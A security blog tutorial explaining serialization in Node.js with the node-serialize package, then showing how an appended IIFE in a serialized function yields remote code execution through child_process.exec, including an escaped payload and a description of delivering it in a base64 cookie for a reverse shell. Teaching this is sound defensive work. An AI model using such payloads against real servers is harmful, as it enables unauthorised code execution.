---
title: "Insecure Deserialization: Node.js"
description: "Insecure deserialization refers to a vulnerability where a program deserializes an attacker-controlled object representation, allowing the attacker to manipulate the structure of the object and potentially cause arbitrary code execution. In this post, we're going to explore the basic serialization and deserialization process using a vulnerable library in Node.js. We'll also see how insecure serialization can lead to remote code execution and a practical example!"
date: 2024-09-06 12:00:00
categories: [General]
tags: ["Web Application", "Insecure Deserialization", "Node.js"]
mermaid: true
image:
  path: "/assets/img/General/Insecure Deserialization/icon.webp"
  alt: Reference Icon
---

---

## **Basic Concepts**

Before diving into insecure deserialization, we first need to understand the concepts of serialization and deserialization and what their purposes are.

**Serialization** refers to a process in which an object is converted into a format that can be easily transmitted or saved; deserialization is the opposite process, convert serialized data into a programming object.

What is an object?

An object in programming is basically an instance of a class; It refers to an encapsulated unit of data that has attributes and behaviors (methods and functions) that has been created using a predefined template (a class). These objects are created at runtime and are saved in our computer's memory. Objects encapsulate the state and behaviors of data structures defined by a class.

So, serialization is the process in which we take this unit of data (the class instance) from our memory and converting it into a byte stream that can be sent over a network or persist the object's state by saving it to a file, for example.
Then, deserialization refers to taking this byte stream from a file or from the network and convert it back to a class object in its original state; as we see in the image below.

> refers to an ordered byte sequence that is used to represent data in a format that can be easily interpreted or processed.

![img_1](/assets/img/General/Insecure%20Deserialization/img_1.png)

---

## **Practical Example: Serialization and Deserialization**

We'll be using NodeJs with the `node-serialize` npm package, as it has a very human-readable serialize format. On the other hand, some languages use binary serialization formats; Java for example. This makes the serialized object unreadable for humans or at least significantly less readable, as it will be represented in hex bytes, of course depending on the class used for serialize the object.
For example, when we use the `ObjectOutputStream` class in Java to serialize an object; the serialized data may look something like this:

```
AC ED 00 05 73 72 00 1F 6A 61 76 61 2E 75 74 69
6C 2E 4F 62 6A 65 63 74 24 50 65 72 73 6F 6E 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

With that being said, let's see some examples.

#### **Serialization with node-serialize**

So, here we have an example of object serialization using `node-serialize` package; we defined a class named `Person` with two attributes (name and age) and a method named `greet`, then we created a instance of the class and save in the variable `carlosObj`; then we serialized the object using `serialize.serialize` function.

```js
const serialize = require("node-serialize");

// Class Definition
class Person {
  constructor(name, age) {
    this.name = name;
    this.age = age;
  }
  greet() {
    console.log(`Hello, I am ${this.name}`);
  }
}

// Creating an Person instance
let carlosObj = new Person("Carlos", 14);
// Serializing carlosObj
let carlosObjSerialized = serialize.serialize(carlosObj);

console.log(carlosObjSerialized);
// Output: {"name":"Carlos","age":14}
```

But it seems like something is missing in the output... Oh right, where is the `greet function`?, Well, in Javascript the class functions are not stored within the class instance itself. So, `carlosObj` doesn't directly store the `greet` function. Class functions are stored in the class prototype, this in order to save memory, as these class functions are 'shared' between same class instances.

In order to serialize an object and perserve its functions, we need to use `literal objects` insetad of `class objects`. This is because declared functions in literal objects are stored within the object itself. So, let's see how a serialized function looks.

```js
const serialize = require("node-serialize");

let luis = {
  name: "luis",
  age: 20,
  greet: function () {
    console.log(`Hello, I am ${this.name}`);
  }
};

let luisSerialized = serialize.serialize(luis);

console.log(luisSerialized);
// Output: {"name":"luis","age":20,"greet":"_$$ND_FUNC$$_function () {\n    console.log(`Hello, I am ${this.name}`);\n  }"}
```

Weird... Adittionally if we want to save the serialized object in a file, it is something easy, we just need to provide three additional lines of code. Let me provide an example.

```js
const serialize = require("node-serialize");
const fs = require("fs");

let luis = {
  name: "luis",
  age: 20,
  greet: function () {
    console.log(`Hello, I am ${this.name}`);
  }
};

let luisSerialized = serialize.serialize(luis);
let luisSerializedBytes = Buffer.from(luisSerialized);
fs.writeFileSync("/tmp/luis.txt", luisSerializedBytes);
```

We converted the serialized data into a buffer of bytes. We then used `fs.writeFileSync`, specifing, the path where we want to save the file, and the data we want to write.

```bash
❯ cat /tmp/luis.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /tmp/luis.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ {"name":"luis","age":20,"greet":"_$$ND_FUNC$$_function () {\n    console.log(`Hello, I am ${this.name}`);\n  }"}
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

#### **Deserialization with node-serialize**

So, now how can we convert that data back into a Javascript object?, That's something easy. We just need to use the unserialize function and pass a serialized object to it. Let's first see an example using:

```js
const serialize = require("node-serialize");
const fs = require("fs");

let luis = {
  name: "luis",
  age: 20,
  greet: function () {
    console.log(`Hello, I am ${this.name}`);
  }
};

let luisSerialized = serialize.serialize(luis); // This is the content of luis.txt
let luisObj = serialize.unserialize(luisSerialized);
luisObj.greet();
// Output: Hello, I am luis
```

We just passed `luisSerialized` as a parameter in the unserialize function; and that's all. If we want to read the serialized object from a file, the process is quite similar.

```js
const serialize = require("node-serialize");
const fs = require("fs");

let serializedData = fs.readFileSync("/tmp/luis.txt", { encoding: "utf8" });

let luisObj = serialize.unserialize(serializedData);

luisObj.greet();
// Output: Hello, I am luis
```

---

## **Insecure Deserialization**

Insecure Deserialization is a vulnerability that commonly occurs in web applications;
this vulnerability arises when user-controllable data is deserialized without proper validations, this potentially allows an attacker to manipulate the unserialized objects behavior or even replace the serialized object with an object of a different class.
Manipulating the class might result in an error, but before this happens, it is probably that the damage may be already done. Many deserialization-based attacks are completed before deserialization is finished

### **How do insecure deserialization vulnerabilities arise?**

Deserialization-based attacks generally occur when a backend application trusts in users input and involves this data into a deserialization process. Developers should always try to avoid deserializing user-controllable data; but if this is needed, always implement mechanisms in order to validate the user input, libraries such as `joi` are a great option for verifying user-input.

### **Basic Example**

As we saw, the `node-serialize` package allows us to include functions in our serialized objects. This sounds good, right? Well, not at all. What happens if we pass an `IIFE` to the `unserialize` function?.. Yes, it will be executed. Let's look an example.

#### Generating a payload

To achieve RCE, we can use `child_process` module in NodeJs and invoke `exec` within the function we're serializing. Since we cannot add a `IIFE` directly in the object we're serializing (becuase the function would execute when we serialize the object), we need to manually convert our function into an `IIFE`.
We just need to add `()` after the closing bracket, in this case we don't need to enclose the entire function with parenthesis. We could also need to scape backslashes.

```js
const serializer = require("node-serialize");

const obj = {
  f: function () {
    require("child_process").exec("ls", function () {});
  }
};

let payload = serializer.serialize(obj);
console.log(payload);
```

Result:

```js
{"f":"_$$ND_FUNC$$_function () {\n    require(\"child_process\").exec(\"id\", function (stdin, stdout, sterr) {\n      console.log(stdout);\n    });\n  }"}

Modified Output:
{"f":"_$$ND_FUNC$$_function () {\\n    require(\\"child_process\\").exec(\\"id\\", function (stdin, stdout, sterr) {\\n      console.log(stdout);\\n    });\\n  }()"};
```

#### Deserialize and Execute

Now we can set up a Python HTTP server and try to get some file using curl command in the `exec` function and see if it works.
![img_4](/assets/img/General/Insecure%20Deserialization/img_3.png)

---

### **Practical Example**

Here we have a registration form where we need to provide some information.
![img_4](/assets/img/General/Insecure%20Deserialization/img_4.png)

When we submit the form, the server send us a cookie and we see the submtited information in the dialog.
![img_5](/assets/img/General/Insecure%20Deserialization/img_5.png)

We can try to decode the cookie since it appears to be in base64. We see that it contains the information that we provided.
The decoded data looks like JSON, so it may be deserialized in server-side...
![img_6](/assets/img/General/Insecure%20Deserialization/img_6.png)
We can serialize an object that contains a function that will establish a TCP connection . If the data is deserialized without any sanitization or validation, we could potenttially achieve RCE.
![img_7](/assets/img/General/Insecure%20Deserialization/img_7.png)

We need to convert our function into a `IIFE` and escape backslashes. Then we encode our payload in base64.
![img_8](/assets/img/General/Insecure%20Deserialization/img_8.png)

Finally, we set up a TCP listener and set our payload as a cookie, when we refresh the page, the server will decode and deserialize our cookie, executing our function and sending us a shell.
![img_9](/assets/img/General/Insecure%20Deserialization/img_9.png)
